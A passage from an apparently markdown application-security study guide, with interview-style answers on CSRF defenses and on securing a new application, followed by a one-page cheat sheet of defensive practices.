CSRF exploits the fact that browsers attach cookies automatically based on destination, regardless of which site initiated the request. So a malicious page can submit a form to your bank, the browser attaches the session cookie, and the action executes with the victim's authority.

The defenses layer. SameSite=Lax cookies block it for state-changing methods and are now the browser default, which has substantially reduced CSRF in practice. Anti-CSRF tokens work because the attacker's site cannot read the token — the same-origin policy prevents it — so they can't include it. Double-submit cookies are the stateless variant, though weaker if a subdomain is compromised. Origin and Referer validation add a useful check.

The nuance worth stating: APIs using bearer tokens in an Authorization header aren't CSRF-vulnerable, because browsers don't attach those automatically. But if the same endpoints also accept cookie authentication, you're vulnerable again — so accepting both auth mechanisms on the same routes is the mistake to look for.

And for genuinely sensitive operations like changing a password or transferring money, re-authentication is worth the friction.
</details>

<details>
<summary><b>Q8. How would you approach securing a new application?</b></summary>

Threat model at design time, before code exists. Draw the data flow, mark the trust boundaries — browser to server, service to service, third party to you — and apply STRIDE at each one. That catches architectural flaws that cannot be patched later, which is exactly why OWASP added "Insecure Design" as a category.

Then make the secure path the easy path, because developers use what's convenient. A shared data access layer that requires an actor parameter makes BOLA structurally difficult. An HTTP client with SSRF protection built in means nobody has to remember. Frameworks with safe defaults for encoding and headers.

In CI: SAST, secret scanning, dependency and container scanning — with a real patch SLA rather than an ignored report. Plus authorization tests that attempt cross-tenant access, since that's the highest-severity class and the one normal testing misses entirely.

At runtime: least privilege everywhere, secrets from a manager or ideally workload identity so there's no static secret at all, and security event logging covering authentication attempts, authorization failures, and privilege changes.

And an incident response plan plus a disclosure contact, because you will eventually receive a vulnerability report and having no process wastes the goodwill of whoever sent it.

The framing I'd emphasize: every control fails eventually, so the question is always what the next layer is.
</details>

---

## 16. Cheat Sheet

```
╔══════════════════════════════════════════════════════════════════════╗
║                   APPLICATION SECURITY — ONE PAGE                    ║
╠══════════════════════════════════════════════════════════════════════╣
║ ⭐ TWO ROOT CAUSES                                                    ║
║   1. DATA BECOMES CODE → separate code from data at the interpreter  ║
║      (parameterized queries, contextual encoding, arg arrays)        ║
║   2. MISSING AUTHORIZATION → check WHO may do WHAT to THIS OBJECT    ║
╠══════════════════════════════════════════════════════════════════════╣
║ ⭐⭐ BOLA/IDOR is the #1 real API breach                               ║
║   scope EVERY query by owner · 404 not 403 · make it structurally    ║
║   impossible (data layer requires an actor) · CI cross-tenant tests  ║
║ Mass assignment → explicit ALLOWLIST (extra="forbid"), never denylist║
╠══════════════════════════════════════════════════════════════════════╣
║ SQLi: parameterize. ⚠️ CANNOT parameterize identifiers/ORDER BY →     ║
║   allowlist. ⚠️ ORM raw-SQL escape hatches are where the bugs are     ║
║ CMD injection: execFile(ARRAY) never exec(string)                    ║
║ XSS: context-specific encoding · frameworks encode by default →      ║
║   ⭐ the bugs are in dangerouslySetInnerHTML/v-html/innerHTML         ║
║   DOMPurify if you must · CSP nonce+strict-dynamic as depth          ║
╠══════════════════════════════════════════════════════════════════════╣
║ ⚠️⚠️ SSRF → 169.254.169.254 → IAM CREDENTIALS → cloud compromise      ║
║   allowlist (denylist is unwinnable) · validate the RESOLVED IP and  ║
║   pin it · block link-local · no redirects · IMDSv2 · egress policy  ║
╠══════════════════════════════════════════════════════════════════════╣
║ PASSWORDS: Argon2id (⭐ MEMORY-HARD defeats GPUs) · no forced         ║
║   rotation · no composition rules · check breach lists · allow paste ║
║   ⭐ hash a DUMMY for missing users (timing = enumeration)            ║
║ MFA: ⭐ passkeys/WebAuthn are the only PHISHING-RESISTANT factor      ║
╠══════════════════════════════════════════════════════════════════════╣
║ SESSIONS: HttpOnly+Secure+SameSite=Lax · ⭐ REGENERATE ID on login    ║
║   (fixation) · invalidate SERVER-SIDE on logout                      ║
║ JWT: not encrypted · can't revoke → short access + rotating opaque   ║
║   refresh with ⭐ REUSE DETECTION · PIN the alg · never localStorage  ║
╠══════════════════════════════════════════════════════════════════════╣
║ ⚠️ CORS IS NOT A SECURITY CONTROL — never reflect Origin with         ║
║   credentials: true                                                  ║
║ HEADERS: HSTS · CSP · nosniff · Referrer-Policy · frame-ancestors    ║
║ ⚠️ NEVER deserialize untrusted data (pickle/ObjectInputStream = RCE)  ║
║ UPLOADS: validate CONTENT not extension · random name · outside      ║
║   web root · separate origin + Content-Disposition                   ║
╠══════════════════════════════════════════════════════════════════════╣
║ SECRETS: ⭐ best is NO SECRET (workload identity) → manager →         ║
║   file → env var → ⚠️ never plaintext                                 ║
║   ⭐ ON LEAK: ROTATE FIRST. Scrubbing git history is NOT remediation. ║
║ THREAT MODEL AT DESIGN TIME — ⭐ trust boundaries are where bugs live ║
║ ⭐ Make the SECURE path the EASY path. Developers use what's easy.    ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

**Next:** [Cryptography →](cryptography.md) · **Related:** [API Design](../03-backend/api-design.md) · [Network Security](network-security.md)
